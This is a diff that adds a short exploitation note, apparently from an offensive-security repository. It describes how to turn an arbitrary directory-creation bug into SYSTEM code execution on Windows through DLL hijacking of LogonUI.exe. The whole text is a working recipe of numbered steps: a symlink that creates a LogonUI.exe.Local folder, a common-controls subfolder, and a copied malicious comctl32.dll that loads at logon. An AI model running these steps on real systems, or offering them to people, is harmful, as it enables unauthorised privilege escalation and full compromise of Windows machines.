@@ -1,0 +1,22 @@
+If you can create directory with FullControl access via service bugs, you can get SYSTEM shell from LogonUI.exe via dll hijacking.
+
+Step 1. Create Directory in C:\windows\system32 as C:\Windows\System32\LogonUI.exe.Local .
+
+createsymlink.exe C:\programdata\vulnlogs\somepath C:\Windows\System32\LogonUI.exe.Local
+
+Then, you can create anything in C:\Windows\System32\LogonUI.exe.Local .
+
+Step 2. Create directory in that folder.
+
+mkdir C:\Windows\System32\LogonUI.exe.Local\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.720_none_e6beb5c51314836b
+
+Step 3. Create/copy payload dll file in that folder as comctl32.dll.
+
+copy malicious.dll C:\Windows\System32\LogonUI.exe.Local\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.720_none_e6beb5c51314836b\comctl32.dll 
+
+Step 4. Then restart or logon-logoff. Your payload dll will execute as SYSTEM.
+
+
+Thanks @PsiDragon for this advice. 
+
+Another way by James Forshaw : https://googleprojectzero.blogspot.com/2017/08/windows-exploitation-tricks-arbitrary.html
